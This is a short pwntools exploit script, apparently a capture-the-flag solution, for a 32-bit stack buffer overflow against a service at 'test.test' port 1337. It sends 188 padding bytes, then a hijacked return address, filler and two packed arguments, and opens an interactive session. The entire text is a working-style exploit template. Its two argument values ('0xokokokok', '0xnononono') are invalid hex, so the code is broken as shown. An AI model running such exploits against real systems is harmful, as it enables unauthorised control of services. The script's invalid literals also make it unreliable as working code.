from pwn import *
ip = "test.test"
port = 1337
addr = p32(0x080491e2)
no = "AAAA"
arg1 = p32(0xokokokok)
arg2 = p32(0xnononono)
payload = "A"*188+addr+no+arg1+arg2
r = remote(ip, port)
r.recvline()
r.sendline(payload)
r.interactive()
